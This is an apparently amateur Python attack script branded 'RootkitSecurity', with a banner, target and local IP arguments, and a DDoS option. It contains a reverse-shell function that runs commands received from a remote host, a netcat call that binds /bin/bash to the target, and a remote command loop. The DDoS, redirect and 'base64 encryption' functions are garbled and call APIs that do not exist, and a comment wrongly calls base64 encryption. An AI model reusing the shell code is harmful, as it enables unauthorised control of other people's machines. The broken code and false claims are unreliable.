import argparse
import socket
import subprocess
import requests
import base64




print ('''
                    __   __   .__  __                                      .__  __          
_______  ____   _____/  |_|  | _|__|/  |_    ______ ____   ____  __ _________|__|/  |_ ___.__.
\_  __ \/  _ \ /  _ \   __\  |/ /  \   __\  /  ___// __ \_/ ___\|  |  \_  __ \  \   __<   |  |
 |  | \(  <_> |  <_> )  | |    <|  ||  |    \___ \\  ___/\  \___|  |  /|  | \/  ||  |  \___  |
 |__|   \____/ \____/|__| |__|_ \__||__|   /____  >\___  >\___  >____/ |__|  |__||__|  / ____|
                               \/               \/     \/     \/                       \/     
Version 1.0v
 >>>>>>>                             C0d3d by RootkitSecurity
''')



parser = argparse.ArgumentParser(description='Commands')
parser.add_argument('-t', '--target', help='Target IP Address', required=True)
parser.add_argument('-p', '--port', help='Target Port', required=True)
parser.add_argument('-l', '--localhost', help='localhost IP', required=True)
parser.add_argument('-lp', '--lp', help='local port', required=True)
parser.add_argument('-ddos', '--ddos', help='Attack a site', required=False)
args = parser.parse_args()

target_ip = args.target
target_port = args.port
localhost_ip = args.localhost

def target_connection():
    target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    target.connect((target_ip, int(target_port)))
    target.send(f"{localhost_ip} connected to the target machine".encode())

    def linux_shell():
        while True:
            command = input(f"{localhost_ip}@{target_ip}>")
            target.send(command.encode())
            output = target.recv(1024)
            print(output.decode())
            linux_shell = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            linux_shell = linux_shell.stdout.read() + linux_shell.stderr.read()
    linux_shell()

target_connection()




def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    while True:
        command = s.recv(1024).decode()
        if 'exit' in command:
            s.close()
            break
        else:
            output = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            s.send(output.stderr.read())
            s.send(output.stdout.read())
    return

## make a function to transfer with sftp 'shell.sh'
def transfer_sftp(host, port):
 sftp = subprocess.Popen(["nc", "-e", "/bin/bash", target_ip, target_port])
 sftp = transfer.file.read('shell.sh')
 sftp = sftp.stdout.read() + sftp.stderr.read()
 ## Generate and transfer a file called shell.txt to the target machine
def generate_file():
    with open('shell.sh', 'w') as f:
        f.write('#!/bin/bash')
        
        
        ## Execute a the whoami command on the target machine
        def ls():
            ls = subprocess.Popen('whoami', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            ls = ls.stdout.read() + ls.stderr.read()
            return ls
        
        
        
        ## Commands

def execute_command(command):
    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = output.communicate()
    return stdout.decode(), stderr.decode()

stdout, stderr = execute_command("ls")
print("Salida estándar:")
print(stdout)
print("Salida de error:")
print(stderr)

    
    
    
    ## Create a function to redirect the traffic from the target machine to sites
def ddos_site():
        ddos_site = requests.get()
        ddos_site = ddos_site.stdout.read() + ddos_site.stderr.read()
        ddos_site = send.request('GET', url)
        ddos_site = threading.Thread(9500004)
        ddos_site = sleep(1)
        ddos_site = send.all(URL)
        ddos_site = send.all(URL)
        ddos_site = requests.sessions(1)
        ddos_site = threading.Thread(9500004)
        
        ## Create a function to redirect the traffic from the target machine to sites
        def redirect_func():
            redirect_func = requests.get()
            redirect_func = redirect_func.stdout.read() + redirect_func.stderr.read()
            redirect_func = send.request('GET', url)
            redirect_func = requests.sendall(requests)
            redirect_func = ddos_site(URL, 9500004)
            
            ## Create a function to send 1000 get requests to the target per second
def request_sc():
    request_sc = requests.get(target_ip)
    request_sc = threading.Thread(target=request_sc)
    request_sc.start()
    request_sc.thread_count = 1000
    while request_sc.thread_count > 0:
        request_sc()
        request_sc.thread_count -= 1

        
        
        def encrypt_rq():
            encrypt_rq = base64.b64encode('GET / HTTP/1.1\r\nHost:' + url + '\r\n\r\n')
            encrypt_rq = encrypt_rq.stdout.read() + encrypt_rq.stderr.read()
            encrypt_rq = base64.requests.send(encrypt_rq)
            base64 = linux_shell.encode('base64')
            ## when the sended request is encoded in base64, the server will mantain encrypted the request
            def mantain_base64():
                maintain_base64 = base64.requests.send(encrypt_rq)
                maintain_base64 = requests.base64(traffic)